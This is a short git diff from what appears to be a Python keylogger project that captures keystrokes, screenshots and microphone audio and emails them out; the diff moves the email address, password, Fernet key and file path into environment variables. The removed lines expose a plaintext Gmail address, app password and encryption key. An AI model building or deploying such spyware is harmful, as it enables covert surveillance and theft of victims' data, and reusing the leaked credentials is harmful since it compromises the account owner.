@@ -17,6 +17,9 @@ from cryptography.fernet import Fernet
 import getpass
 from requests import get
 from PIL import ImageGrab
+from dotenv import load_dotenv
+
+load_dotenv()
 
 keys_information = "key_log.txt"
 system_information = "system_information.txt"
@@ -33,17 +36,16 @@ microphone_time = 10
 time_iteration = 5
 number_of_iterations_end = 2
 
-email_address = "romanrtera@gmail.com"
-password = "wjrx pxld iyqu lvec"
+email_address = os.getenv("EMAIL_ADDRESS")
+password = os.getenv("PASSWORD")
 
 username = getpass.getuser()
 
-to_addr = "romanrtera@gmail.com"
+to_addr = os.getenv("TO_ADDR_RAZVAN")
 
-key = "1EOZBnHLTFjU6qovA2eO_jckUR0NNGCg3Dq4Oys2WvA="
+key = os.getenv("KEY")
 
-file_path = "D:\\keylog\\Keylogger\\Project"
-# file_path = "C:\\Users\\BOGI\\Desktop\\Keylogger\\keylogger\\Project"
+file_path = os.getenv("FILE_PATH_RAZVAN")
 extend = "\\"
 file_merge = file_path + extend
 
